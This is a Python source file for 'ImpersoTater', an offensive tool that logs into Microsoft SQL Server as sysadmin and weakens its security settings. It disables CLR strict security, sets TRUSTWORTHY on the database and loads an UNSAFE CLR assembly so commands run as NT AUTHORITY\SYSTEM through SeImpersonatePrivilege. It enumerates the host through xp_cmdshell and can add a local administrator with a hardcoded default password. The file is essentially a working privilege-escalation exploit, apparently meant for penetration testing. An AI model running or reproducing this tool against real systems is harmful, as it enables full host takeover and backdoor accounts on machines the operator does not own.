#!/usr/bin/env python3
"""ImpersoTater — In-memory SeImpersonatePrivilege escalation via MSSQL CLR assembly

Deploys a CLR stored procedure into SQL Server that exploits
SeImpersonatePrivilege to execute commands as NT AUTHORITY\\SYSTEM
without writing any executable to disk. The entire payload runs
inside the sqlservr.exe process.

Usage:
  ImpersoTater.py [domain/]user[:pass]@host -c "whoami"
  ImpersoTater.py -u sa -p Password1 -t 10.0.0.5 -c "whoami /all"
  ImpersoTater.py ecorp/admin:Pass@10.0.0.5 -c "net user" --technique spooler
"""

import argparse
import os
import re
import shutil
import subprocess
import sys
import io


_DIR = os.path.dirname(os.path.abspath(__file__))


def _read_cs(name):
    with open(os.path.join(_DIR, name)) as f:
        return f.read()


def mssql_connect(host, port, username, password, domain, windows_auth):
    from impacket import tds
    sql = tds.MSSQL(host, int(port))
    sql.connect()
    if windows_auth:
        ok = sql.login(None, username, password, domain, None, True)
    else:
        ok = sql.login(None, username, password, '', None, False)
    if not ok:
        print('[!] MSSQL login failed', file=sys.stderr)
        sys.exit(1)
    return sql


def sql_exec_raw(sql, query):
    sql.sql_query(query)
    old = sys.stdout
    sys.stdout = buf = io.StringIO()
    try:
        sql.printRows()
    except Exception:
        pass
    sys.stdout = old
    return buf.getvalue().strip()


def compile_dll():
    cs_core = os.path.join(_DIR, 'ImpersoTater.cs')
    cs_sql = os.path.join(_DIR, 'ImpersoTater_sql.cs')
    dll_path = os.path.join(_DIR, 'ImpersoTater.dll')

    if not os.path.isfile(cs_core) or not os.path.isfile(cs_sql):
        print('[!] C# source files not found', file=sys.stderr)
        sys.exit(1)

    if not shutil.which('mcs'):
        print('[!] mcs (Mono C# compiler) not found. Run: ./install.sh', file=sys.stderr)
        sys.exit(1)

    cmd = ['mcs', '-target:library', '-out:' + dll_path,
           '-r:System.Data', cs_core, cs_sql]
    r = subprocess.run(cmd, capture_output=True, text=True)
    if r.returncode != 0:
        print(f'[!] Compilation failed:\n{r.stderr}', file=sys.stderr)
        sys.exit(1)
    print(f'[+] Compiled CLR assembly ({os.path.getsize(dll_path)} bytes)')
    return dll_path


def deploy_clr(sql, dll_path, cmd, technique):
    with open(dll_path, 'rb') as f:
        dll_bytes = f.read()
    hex_str = '0x' + dll_bytes.hex().upper()

    print('[*] Checking prerequisites...')

    out = sql_exec_raw(sql, "SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'clr enabled'")
    if '1' not in out:
        print('[*] Enabling CLR...')
        sql_exec_raw(sql, "EXEC sp_configure 'clr enabled', 1; RECONFIGURE;")

    out = sql_exec_raw(sql, "SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'clr strict security'")
    strict_was_on = '1' in out

    if strict_was_on:
        print('[*] Temporarily disabling CLR strict security...')
        sql_exec_raw(sql, "EXEC sp_configure 'clr strict security', 0; RECONFIGURE;")

    out = sql_exec_raw(sql, "SELECT name FROM sys.assemblies WHERE name = 'ImpersoTaterAsm'")
    if 'ImpersoTaterAsm' in out:
        print('[*] Dropping existing assembly...')
        sql_exec_raw(sql, "IF OBJECT_ID('dbo.ImpersoTaterExec') IS NOT NULL DROP PROCEDURE dbo.ImpersoTaterExec;")
        sql_exec_raw(sql, "DROP ASSEMBLY ImpersoTaterAsm;")

    db_name = sql_exec_raw(sql, "SELECT DB_NAME()")
    if db_name:
        db = db_name.strip().split('\n')[-1].strip()
        if db and db != '-':
            print(f'[*] Setting {db} TRUSTWORTHY ON...')
            sql_exec_raw(sql, f"ALTER DATABASE [{db}] SET TRUSTWORTHY ON;")

    print(f'[*] Deploying CLR assembly ({len(dll_bytes)} bytes)...')
    out = sql_exec_raw(sql, f"CREATE ASSEMBLY ImpersoTaterAsm FROM {hex_str} WITH PERMISSION_SET = UNSAFE;")
    if 'error' in out.lower() or 'fail' in out.lower():
        print(f'[!] Assembly creation failed: {out}', file=sys.stderr)
        if strict_was_on:
            sql_exec_raw(sql, "EXEC sp_configure 'clr strict security', 1; RECONFIGURE;")
        return None

    print('[*] Creating stored procedure...')
    sql_exec_raw(sql, """
        CREATE PROCEDURE dbo.ImpersoTaterExec @cmd NVARCHAR(4000), @technique NVARCHAR(100)
        AS EXTERNAL NAME ImpersoTaterAsm.[PotatoProc].ExecWith;
    """)

    print(f'[*] Executing: {cmd}')
    print(f'[*] Technique: {technique}')
    escaped = cmd.replace(chr(39), chr(39)+chr(39))
    result = sql_exec_raw(sql, f"EXEC dbo.ImpersoTaterExec @cmd = N'{escaped}', @technique = N'{technique}';")

    print(f'\n[+] Result:\n{result}')
    return result


def cleanup_clr(sql, restore_strict):
    print('\n[*] Cleaning up...')
    sql_exec_raw(sql, "IF OBJECT_ID('dbo.ImpersoTaterExec') IS NOT NULL DROP PROCEDURE dbo.ImpersoTaterExec;")

    out = sql_exec_raw(sql, "SELECT name FROM sys.assemblies WHERE name = 'ImpersoTaterAsm'")
    if 'ImpersoTaterAsm' in out:
        sql_exec_raw(sql, "DROP ASSEMBLY ImpersoTaterAsm;")

    if restore_strict:
        print('[*] Restoring CLR strict security...')
        sql_exec_raw(sql, "EXEC sp_configure 'clr strict security', 1; RECONFIGURE;")

    print('[+] Cleanup complete')


def enumerate_target(sql):
    print('\n[*] Enumerating target...')
    info = {}

    out = sql_exec_raw(sql, "SELECT @@VERSION")
    ver_line = out.strip().split('\n')[-1] if out.strip() else ''
    info['version'] = ver_line
    print(f'    SQL Version: {ver_line[:80]}')

    out = sql_exec_raw(sql, "SELECT SYSTEM_USER")
    info['login'] = out.strip().split('\n')[-1].strip() if out.strip() else ''
    print(f'    Login: {info["login"]}')

    out = sql_exec_raw(sql, "SELECT IS_SRVROLEMEMBER('sysadmin')")
    is_sa = '1' in out
    info['sysadmin'] = is_sa
    print(f'    Sysadmin: {is_sa}')

    if not is_sa:
        print('[!] Not sysadmin — CLR deployment requires sysadmin', file=sys.stderr)
        sys.exit(1)

    out = sql_exec_raw(sql, "EXEC xp_cmdshell 'whoami /priv'")
    info['privs'] = out
    has_impersonate = 'SeImpersonatePrivilege' in out and 'Enabled' in out
    print(f'    SeImpersonatePrivilege: {has_impersonate}')

    if not has_impersonate:
        print('[!] SeImpersonatePrivilege not available', file=sys.stderr)
        sys.exit(1)

    out = sql_exec_raw(sql, "EXEC xp_cmdshell 'sc query spooler'")
    spooler = 'RUNNING' in out.upper()
    info['spooler'] = spooler
    print(f'    Print Spooler: {"running" if spooler else "stopped/missing"}')

    out = sql_exec_raw(sql, "EXEC xp_cmdshell 'whoami'")
    lines = [l.strip() for l in out.strip().split('\n')
             if l.strip() and l.strip() != 'NULL' and '---' not in l and l.strip() != 'output']
    svc_acct = lines[-1] if lines else '(unknown)'
    info['service_account'] = svc_acct
    print(f'    Service Account: {svc_acct}')

    return info


def build_add_user_cmd(spec):
    if spec == '_generate_':
        user = 'tater'
        passwd = 'Imp3rs0T@ter!'
    elif ':' in spec:
        user, passwd = spec.split(':', 1)
    else:
        print('[!] --add-user format: USER:PASS or omit for auto-generated', file=sys.stderr)
        sys.exit(1)

    print(f'[*] Will create local admin: {user} / {passwd}')
    return (
        f'net user {user} {passwd} /add && '
        f'net localgroup administrators {user} /add && '
        f'echo [+] Local admin created: {user}'
    )


def parse_args():
    p = argparse.ArgumentParser(
        description='ImpersoTater — In-memory SYSTEM escalation via MSSQL CLR assembly',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    p.add_argument('target_string', nargs='?', metavar='[domain/]user[:pass]@host',
                   help='Impacket-style target string')
    p.add_argument('-t', '--target', metavar='HOST')
    p.add_argument('-P', '--port', default='1433')
    p.add_argument('-u', '--username', metavar='USER')
    p.add_argument('-p', '--password', metavar='PASS')
    p.add_argument('-d', '--domain', metavar='DOMAIN', default='')
    p.add_argument('-w', '--windows-auth', action='store_true',
                   help='Use Windows/domain authentication')
    action = p.add_mutually_exclusive_group(required=True)
    action.add_argument('-c', '--command',
                        help='Command to execute as SYSTEM')
    action.add_argument('--add-user', nargs='?', const='_generate_',
                        metavar='USER:PASS',
                        help='Create local admin. USER:PASS or auto-generated if omitted')
    action.add_argument('--enum-only', action='store_true',
                        help='Only enumerate target, do not execute')
    p.add_argument('--technique', choices=['auto', 'spooler', 'direct'],
                   default='auto', help='Privilege escalation technique (default: auto)')
    p.add_argument('--no-cleanup', action='store_true',
                   help='Leave CLR assembly deployed after execution')
    return p.parse_args()


def apply_target(args):
    ts = args.target_string
    if not ts:
        if not args.target:
            print('[!] Target required: use positional arg or -t', file=sys.stderr)
            sys.exit(1)
        return

    at = ts.rfind('@')
    if at >= 0:
        host = ts[at + 1:]
        prefix = ts[:at]
        m = re.match(r'^(?:(?P<d>[^/]+)/)?(?P<u>[^:]+)(?::(?P<p>.*))?$', prefix)
        if m:
            if m.group('d') and not args.domain:
                args.domain = m.group('d')
            if m.group('u') and not args.username:
                args.username = m.group('u')
            pw = m.group('p')
            if pw is not None and not args.password:
                args.password = pw
        if not args.target:
            args.target = host
    else:
        if not args.target:
            args.target = ts


def main():
    args = parse_args()
    apply_target(args)

    if not args.username or not args.password:
        print('[!] Username and password required', file=sys.stderr)
        sys.exit(1)

    windows_auth = args.windows_auth or bool(args.domain)

    print(f'[*] Connecting to {args.target}:{args.port}...')
    sql = mssql_connect(args.target, args.port, args.username, args.password,
                        args.domain, windows_auth)
    print(f'[+] Connected')

    info = enumerate_target(sql)

    if args.enum_only:
        print('\n[*] Enumeration complete (--enum-only)')
        sql.disconnect()
        return

    if args.add_user is not None:
        cmd = build_add_user_cmd(args.add_user)
    else:
        cmd = args.command

    print('\n[*] Deploying CLR assembly...')
    dll_path = compile_dll()

    out = sql_exec_raw(sql, "SELECT CAST(value_in_use AS INT) FROM sys.configurations WHERE name = 'clr strict security'")
    strict_was_on = '1' in out

    result = deploy_clr(sql, dll_path, cmd, args.technique)

    if not args.no_cleanup:
        cleanup_clr(sql, strict_was_on)

    try:
        os.remove(dll_path)
    except OSError:
        pass

    sql.disconnect()
    print('\n[*] Done')


if __name__ == '__main__':
    main()
